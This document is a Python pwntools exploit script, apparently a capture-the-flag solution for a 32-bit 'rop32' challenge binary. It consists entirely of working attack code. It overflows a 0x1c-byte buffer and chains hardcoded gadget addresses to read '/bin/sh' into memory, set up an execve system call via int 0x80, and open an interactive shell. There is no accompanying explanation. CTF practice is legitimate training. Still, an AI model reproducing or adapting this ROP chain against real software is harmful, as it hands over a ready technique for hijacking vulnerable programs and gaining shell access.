from pwn import *

path = "/problems/rop32_5_2d440477006ae493785b023972c694df"
elf = ELF("{}/vuln".format(path))
sock = process("{}/vuln".format(path), cwd=path)
#elf = ELF("./vuln")
#sock = process("./vuln")

rop_xchg_eax_ecx_pop3 = 0x080830f4
rop_pop_edi = 0x080919ab
rop_xchg_eax_edi = 0x08077481
rop_pop_ebx = 0x080481c9
rop_pop_edx = 0x0806ee6b
rop_int_80 = 0x08049563
rop_pop3 = 0x0804834a
addr = 0x80dc400

payload = 'A' * 0x1c
payload += p32(elf.symbols['read'])
payload += p32(rop_pop3)
payload += p32(0)
payload += p32(addr)
payload += p32(8)

payload += p32(rop_pop_edi)
payload += p32(0)
payload += p32(rop_xchg_eax_edi)
payload += p32(rop_xchg_eax_ecx_pop3)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(rop_pop_edi)
payload += p32(11)
payload += p32(rop_xchg_eax_edi)
payload += p32(rop_pop_ebx)
payload += p32(addr)
payload += p32(rop_pop_edx)
payload += p32(0)
payload += p32(rop_int_80)
assert '\n' not in payload
sock.recvline()
_ = raw_input()
sock.sendline(payload)
sock.send("/bin/sh\x00")

sock.interactive()
